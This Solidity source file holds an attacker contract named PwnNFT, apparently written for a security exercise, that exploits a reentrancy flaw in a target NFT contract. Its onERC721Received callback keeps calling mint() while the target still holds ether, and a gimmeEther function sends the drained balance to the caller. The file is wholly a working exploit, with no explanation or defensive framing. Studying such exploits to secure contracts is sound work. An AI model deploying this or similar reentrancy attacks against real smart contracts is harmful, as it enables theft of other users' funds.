// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import { ProblematicNFT } from "./ProblematicNFTMint.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract PwnNFT is IERC721Receiver {
    ProblematicNFT public problematicNFT;

    constructor(address _problematicNFTAddress) {
        problematicNFT = ProblematicNFT(_problematicNFTAddress);
    }

    function pwnNFTMint() public payable {
        require(msg.value >= 1e17, "gotta deposit more funds");

        problematicNFT.deposit{ value: msg.value }();
        problematicNFT.mint();
    }

    function gimmeEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (address(problematicNFT).balance > 1e17 - 1) {
            problematicNFT.mint();
        }
        return this.onERC721Received.selector;
    }
}
